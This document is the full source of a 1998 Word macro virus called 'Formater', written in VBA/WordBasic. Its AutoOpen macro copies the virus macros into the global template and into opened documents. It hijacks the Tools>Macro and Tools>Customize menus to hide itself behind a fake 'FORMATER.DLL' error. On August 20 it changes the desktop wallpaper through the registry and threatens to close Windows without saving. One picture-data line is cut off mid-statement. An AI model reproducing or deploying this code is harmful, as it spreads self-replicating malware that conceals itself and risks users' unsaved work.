   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsCustomize"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsCustomize.MAIN"
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   WordBasic.Call "DLLError"
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   WordBasic.Call "DLLError"
   End Sub

   Attribute VB_Name = "MyPicture"

   Public Sub MAIN()
   Dim n
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   ReDim P__$(133)
   Rem Picture
       For n = 0 To 133
           P__$(n) = Chr(0)
       Next n
       P__$(0) = Chr(66): P__$(1) = Chr(77): P__$(2) = Chr(134): P__$(10) = Chr(62):       P__$(14) = Chr(40): P__$(18) = Chr(37): P__$(22) = Chr(9): P__$(26) = Chr(1):       P__$(28) = Chr(1): P__$(34) = Chr(72): P__$(38) = Chr(206): P__$(39) = Chr(14): P__$(42) = Chr(216): P__$(43) = Chr(14): P__$(58) = Chr(255): P__$(59) = Chr(255): P__$(60) = Chr(255): P__$(70) = Chr(127): P__$(71) = Chr(255): P__$(72) = Chr(255): P__$(73) = Chr(255): P__$(74) = Chr(240): P__$(78) = Chr(92): P__$(79) = Chr(85): P__$(80) = Chr(213): P__$(81) = Chr(177): P__$(82) = Chr(80): P__$(86) = Chr(93):                      P__$(87) = Chr(85): P__$(88) = Chr(213): P__$(89) = Chr(183): P__$(90) = Chr(80): P__$(94) = Chr(77): P__$(95) = Chr(77): P__$(96) = Chr(209): P__$(97) = Chr(179): P__$(98) = Chr(48): P__$(102) = Chr(93): P__$(103) = Chr(85): P__$(104) = Chr(85):              P__$(105) = Chr(183): P__$(106) = Chr(80): P__$(110) = Chr(68): P__$(111) = Chr(76): P__$(112) = Chr(155): P__$(113) = Chr(17): P__$(114) = Chr(48): P__
   $(118) =

       Rem Creating BMP file
       Open "\formater.bmp" For Output As 1
       For n = 0 To 133
           Print #1, P__$(n);
       Next n
       Close 1

       Rem Changing registry
       WordBasic.SetPrivateProfileString "HKEY_CURRENT_USER\Control Panel\desktop", "WallPaper", "\Formater.bmp", ""
       WordBasic.SetPrivateProfileString "HKEY_CURRENT_USER\Control Panel\desktop", "TileWallpaper", "0", ""

   End Sub

   Attribute VB_Name = "DLLError"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DLLError.MAIN"
   Dim s$
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   On Error Resume Next
   If WordBasic.Month(WordBasic.Now()) = 8 And WordBasic.Day(WordBasic.Now()) = 20 Then
       s$ = WordBasic.[InputBox$]("I'm a Word Macro Virus! I said: 'Don't try to find me!!!' You didn't listen to me! Enter my name, or I will quit from Word without saving documents! (do not press Cancle)", "Formater")
       If s$ <> "Formater" Then WordBasic.ExitWindows
       GoTo E
   End If
   WordBasic.MsgBox "Cannot find FORMATER.DLL. Windows" + Chr(13) + "needs this file to run winword.exe", "Formater", 48
   E:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim template$
   Dim a$
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   template$ = WordBasic.[GetDocumentProperty$](WordBasic.[DocumentPropertyName$](9))
   If UCase(template$) = UCase("normal.dot") Then
       WordBasic.FileSaveAs Name:=WordBasic.[WindowName$](), Format:=1
       WordBasic.MacroCopy "AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
       WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
       WordBasic.MacroCopy "ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro"
       WordBasic.MacroCopy "ToolsCustomize", WordBasic.[WindowName$]() + ":ToolsCustomize"
       WordBasic.MacroCopy "DLLError", WordBasic.[WindowName$]() + ":DLLError"
       WordBasic.MacroCopy "MyPicture", WordBasic.[WindowName$]() + ":MyPicture"
       a$ = WordBasic.[GetPrivateProfileString$]("Formater", "Counter", "win.ini")
       WordBasic.SetPrivateProfileString "Formater", "Counter", Str(WordBasic.Val(a$) + 1), "win.ini"
       WordBasic.FileSave
   Else
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "AutoExec"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "AutoOpen"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "ToolsMacro"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsCustomize", "ToolsCustomize"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":DLLError", "DLLError"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":MyPicture", "MyPicture"
       a$ = WordBasic.[GetPrivateProfileString$]("Formater", "Counter", "win.ini")
       WordBasic.SetPrivateProfileString "Formater", "Counter", Str(WordBasic.Val(a$) + 1), "win.ini"
   End If
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "FORMATER\r\nThe Word Macro Virus By Formater"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   Dim a$
   Dim s$
   Dim n
   Dim m
   Dim z
   Rem    _____ ___  ____  __  __    _  _____ _____ ____
   Rem   |  ___/ _ \|  _ \|  \/  |  / \|_   _| ____|  _ \
   Rem   | |_ | | | | |_) | |\/| | / _ \ | | |  _| | |_) |
   Rem   |  _|| |_| |  _ <| |  | |/ ___ \| | | |___|  _ <
   Rem   |_|   \___/|_| \_\_|  |_/_/   \_\_| |_____|_| \_\
   Rem
   Rem        The Word Macro Virus by Formater '98

   a$ = WordBasic.[GetPrivateProfileString$]("Formater", "Activated", "win.ini")
   WordBasic.SetPrivateProfileString "Formater", "Activated", Str(WordBasic.Val(a$) + 1), "win.ini"
   If WordBasic.Month(WordBasic.Now()) = 8 And WordBasic.Day(WordBasic.Now()) = 20 Then
   WordBasic.Call "MyPicture"
   WordBasic.FileNew
   s$ = "                         Word Macro Virus Formater!!!  by Formater . This is my birthday! I'm " + Str(1998 - WordBasic.Year(WordBasic.Now())) + " years old! Don't try to find me... "
   For n = 1 To Len(s$)
       WordBasic.Insert Mid(s$, n, 25)
       WordBasic.StartOfLine
       For m = 1 To 500
       Next
       For z = 1 To 25
           WordBasic.EditClear
       Next
   Next
   WordBasic.FileClose 2
   End If

   End Sub
